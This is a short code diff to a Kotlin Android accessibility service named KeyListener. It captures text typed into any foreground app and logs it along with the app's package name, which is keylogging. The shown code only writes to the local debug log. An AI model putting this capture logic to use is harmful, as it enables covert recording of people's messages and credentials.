@@ -11,18 +11,18 @@ class KeyListener : AccessibilityService() {
         val eventType: Int = event.getEventType()
         val eventText: String? = null
         when (eventType) {
-            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {}
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                val currApp: String = event.getPackageName().toString()
+                if (foregroundApp == currApp || foregroundApp.isEmpty()) {
+                    lastMsg = event.getText().toString()
+                    Log.d("Pre", "$currApp  :  $lastMsg")
+                } else {
+                    Log.d("Final ", "$foregroundApp :  $lastMsg")
+                }
+                foregroundApp = currApp
+                lastMsg = event.getText().toString()
+            }
         }
-        val currApp: String = event.getPackageName().toString()
-        if (foregroundApp == currApp || foregroundApp.isEmpty()) {
-            lastMsg = event.getText().toString()
-            Log.d("Pre", "$currApp  :  $lastMsg")
-        } else {
-            Log.d("Final ", "$foregroundApp :  $lastMsg")
-        }
-        foregroundApp = currApp
-        lastMsg = event.getText().toString()
     }
-
     override fun onInterrupt() {}
 }
